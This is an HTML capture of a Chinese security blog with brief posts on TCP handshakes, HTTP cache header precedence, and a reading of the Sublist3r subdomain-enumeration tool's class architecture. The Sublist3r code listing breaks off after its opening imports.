    <link itemprop="mainEntityOfPage" href="http://j1nse.cool/2019/05/10/%E7%BD%91%E8%B7%AF%E7%9B%B8%E5%85%B3/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="j1nse">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="j1nse's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2019/05/10/%E7%BD%91%E8%B7%AF%E7%9B%B8%E5%85%B3/" class="post-title-link" itemprop="url">网络相关</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2019-05-10 10:28:36 / 修改时间：10:35:22" itemprop="dateCreated datePublished" datetime="2019-05-10T10:28:36+08:00">2019-05-10</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">web安全</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="TCP与UDP"><a href="#TCP与UDP" class="headerlink" title="TCP与UDP"></a>TCP与UDP</h2><h3 id="TCP三次握手四次挥手"><a href="#TCP三次握手四次挥手" class="headerlink" title="TCP三次握手四次挥手"></a>TCP三次握手四次挥手</h3><p>这是基础知识<br>三次握手<br>syn(i)<br>syn(k) ack(i+1)<br>ack(k+1)</p>
<p>ack(k+1)表示收到k</p>
<p>四次挥手<br>fin(i)<br>ack(i+1)<br>fin(j)<br>ack(j+1)</p>
<p>应用:<br>tcp:<br>http telnet smtp ftp</p>
<p>ucp:<br>dns tftp rip(路由选择协议) dhcp(ip地址管理)<br><img src="https://img-blog.csdn.net/20151018103115179" alt=""></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://j1nse.cool/2019/05/02/post/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="j1nse">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="j1nse's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2019/05/02/post/" class="post-title-link" itemprop="url">http缓存</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2019-05-02 19:15:42 / 修改时间：20:47:05" itemprop="dateCreated datePublished" datetime="2019-05-02T19:15:42+08:00">2019-05-02</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">web安全</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>优先级从高到低分别是 Pragma -&gt; Cache-Control -&gt; Expires 。<br>..感觉还是别人写的好<br>看下面的参考文章吧</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://imweb.io/topic/5795dcb6fb312541492eda8c" target="_blank" rel="noopener">https://imweb.io/topic/5795dcb6fb312541492eda8c</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://j1nse.cool/2019/04/30/sublist3r/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="j1nse">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="j1nse's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2019/04/30/sublist3r/" class="post-title-link" itemprop="url">sublist3r源码阅读</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2019-04-30 14:35:51" itemprop="dateCreated datePublished" datetime="2019-04-30T14:35:51+08:00">2019-04-30</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2019-05-05 17:29:38" itemprop="dateModified" datetime="2019-05-05T17:29:38+08:00">2019-05-05</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">web安全</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>顺便给项目加了个代理功能，要不然国内用户用不了某些引擎:<br><a href="https://github.com/shequ123/Sublist3r" target="_blank" rel="noopener">这里</a></p>
<p>项目比较轻量级，所以就读一读，学一下大佬的程序架构<br>程序有3层：main,基础类 <code>enumratorBase</code> <code>enumratorBaseThreaded</code>，引擎类<code>GoogleEnum</code>等<br>main统筹管理项目运行，基础类被引擎类继承<br>引擎类按情况重写基础类里的方法</p>
<p>引擎类的工作流程:</p>
<ol>
<li>init初始化</li>
<li>从基础类的<code>enumerate()</code>进去</li>
<li>运行引擎的<code>generate_query()</code></li>
<li>每个引擎的差异化体现在<code>generate_query()</code>里，<code>generate_query()</code>会调用其他引擎类里重写的方法</li>
<li>返回找到的子域名给main处理</li>
</ol>
<p>其他的都写在下面代码的注释里了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br><span class="line">768</span><br><span class="line">769</span><br><span class="line">770</span><br><span class="line">771</span><br><span class="line">772</span><br><span class="line">773</span><br><span class="line">774</span><br><span class="line">775</span><br><span class="line">776</span><br><span class="line">777</span><br><span class="line">778</span><br><span class="line">779</span><br><span class="line">780</span><br><span class="line">781</span><br><span class="line">782</span><br><span class="line">783</span><br><span class="line">784</span><br><span class="line">785</span><br><span class="line">786</span><br><span class="line">787</span><br><span class="line">788</span><br><span class="line">789</span><br><span class="line">790</span><br><span class="line">791</span><br><span class="line">792</span><br><span class="line">793</span><br><span class="line">794</span><br><span class="line">795</span><br><span class="line">796</span><br><span class="line">797</span><br><span class="line">798</span><br><span class="line">799</span><br><span class="line">800</span><br><span class="line">801</span><br><span class="line">802</span><br><span class="line">803</span><br><span class="line">804</span><br><span class="line">805</span><br><span class="line">806</span><br><span class="line">807</span><br><span class="line">808</span><br><span class="line">809</span><br><span class="line">810</span><br><span class="line">811</span><br><span class="line">812</span><br><span class="line">813</span><br><span class="line">814</span><br><span class="line">815</span><br><span class="line">816</span><br><span class="line">817</span><br><span class="line">818</span><br><span class="line">819</span><br><span class="line">820</span><br><span class="line">821</span><br><span class="line">822</span><br><span class="line">823</span><br><span class="line">824</span><br><span class="line">825</span><br><span class="line">826</span><br><span class="line">827</span><br><span class="line">828</span><br><span class="line">829</span><br><span class="line">830</span><br><span class="line">831</span><br><span class="line">832</span><br><span class="line">833</span><br><span class="line">834</span><br><span class="line">835</span><br><span class="line">836</span><br><span class="line">837</span><br><span class="line">838</span><br><span class="line">839</span><br><span class="line">840</span><br><span class="line">841</span><br><span class="line">842</span><br><span class="line">843</span><br><span class="line">844</span><br><span class="line">845</span><br><span class="line">846</span><br><span class="line">847</span><br><span class="line">848</span><br><span class="line">849</span><br><span class="line">850</span><br><span class="line">851</span><br><span class="line">852</span><br><span class="line">853</span><br><span class="line">854</span><br><span class="line">855</span><br><span class="line">856</span><br><span class="line">857</span><br><span class="line">858</span><br><span class="line">859</span><br><span class="line">860</span><br><span class="line">861</span><br><span class="line">862</span><br><span class="line">863</span><br><span class="line">864</span><br><span class="line">865</span><br><span class="line">866</span><br><span class="line">867</span><br><span class="line">868</span><br><span class="line">869</span><br><span class="line">870</span><br><span class="line">871</span><br><span class="line">872</span><br><span class="line">873</span><br><span class="line">874</span><br><span class="line">875</span><br><span class="line">876</span><br><span class="line">877</span><br><span class="line">878</span><br><span class="line">879</span><br><span class="line">880</span><br><span class="line">881</span><br><span class="line">882</span><br><span class="line">883</span><br><span class="line">884</span><br><span class="line">885</span><br><span class="line">886</span><br><span class="line">887</span><br><span class="line">888</span><br><span class="line">889</span><br><span class="line">890</span><br><span class="line">891</span><br><span class="line">892</span><br><span class="line">893</span><br><span class="line">894</span><br><span class="line">895</span><br><span class="line">896</span><br><span class="line">897</span><br><span class="line">898</span><br><span class="line">899</span><br><span class="line">900</span><br><span class="line">901</span><br><span class="line">902</span><br><span class="line">903</span><br><span class="line">904</span><br><span class="line">905</span><br><span class="line">906</span><br><span class="line">907</span><br><span class="line">908</span><br><span class="line">909</span><br><span class="line">910</span><br><span class="line">911</span><br><span class="line">912</span><br><span class="line">913</span><br><span class="line">914</span><br><span class="line">915</span><br><span class="line">916</span><br><span class="line">917</span><br><span class="line">918</span><br><span class="line">919</span><br><span class="line">920</span><br><span class="line">921</span><br><span class="line">922</span><br><span class="line">923</span><br><span class="line">924</span><br><span class="line">925</span><br><span class="line">926</span><br><span class="line">927</span><br><span class="line">928</span><br><span class="line">929</span><br><span class="line">930</span><br><span class="line">931</span><br><span class="line">932</span><br><span class="line">933</span><br><span class="line">934</span><br><span class="line">935</span><br><span class="line">936</span><br><span class="line">937</span><br><span class="line">938</span><br><span class="line">939</span><br><span class="line">940</span><br><span class="line">941</span><br><span class="line">942</span><br><span class="line">943</span><br><span class="line">944</span><br><span class="line">945</span><br><span class="line">946</span><br><span class="line">947</span><br><span class="line">948</span><br><span class="line">949</span><br><span class="line">950</span><br><span class="line">951</span><br><span class="line">952</span><br><span class="line">953</span><br><span class="line">954</span><br><span class="line">955</span><br><span class="line">956</span><br><span class="line">957</span><br><span class="line">958</span><br><span class="line">959</span><br><span class="line">960</span><br><span class="line">961</span><br><span class="line">962</span><br><span class="line">963</span><br><span class="line">964</span><br><span class="line">965</span><br><span class="line">966</span><br><span class="line">967</span><br><span class="line">968</span><br><span class="line">969</span><br><span class="line">970</span><br><span class="line">971</span><br><span class="line">972</span><br><span class="line">973</span><br><span class="line">974</span><br><span class="line">975</span><br><span class="line">976</span><br><span class="line">977</span><br><span class="line">978</span><br><span class="line">979</span><br><span class="line">980</span><br><span class="line">981</span><br><span class="line">982</span><br><span class="line">983</span><br><span class="line">984</span><br><span class="line">985</span><br><span class="line">986</span><br><span class="line">987</span><br><span class="line">988</span><br><span class="line">989</span><br><span class="line">990</span><br><span class="line">991</span><br><span class="line">992</span><br><span class="line">993</span><br><span class="line">994</span><br><span class="line">995</span><br><span class="line">996</span><br><span class="line">997</span><br><span class="line">998</span><br><span class="line">999</span><br><span class="line">1000</span><br><span class="line">1001</span><br><span class="line">1002</span><br><span class="line">1003</span><br><span class="line">1004</span><br><span class="line">1005</span><br><span class="line">1006</span><br><span class="line">1007</span><br><span class="line">1008</span><br><span class="line">1009</span><br><span class="line">1010</span><br><span class="line">1011</span><br><span class="line">1012</span><br><span class="line">1013</span><br><span class="line">1014</span><br><span class="line">1015</span><br><span class="line">1016</span><br><span class="line">1017</span><br><span class="line">1018</span><br><span class="line">1019</span><br><span class="line">1020</span><br><span class="line">1021</span><br><span class="line">1022</span><br><span class="line">1023</span><br><span class="line">1024</span><br><span class="line">1025</span><br><span class="line">1026</span><br><span class="line">1027</span><br><span class="line">1028</span><br><span class="line">1029</span><br><span class="line">1030</span><br><span class="line">1031</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="comment"># Sublist3r v1.0</span></span><br><span class="line"><span class="comment"># By Ahmed Aboul-Ela - twitter.com/aboul3la</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># modules in standard library</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span 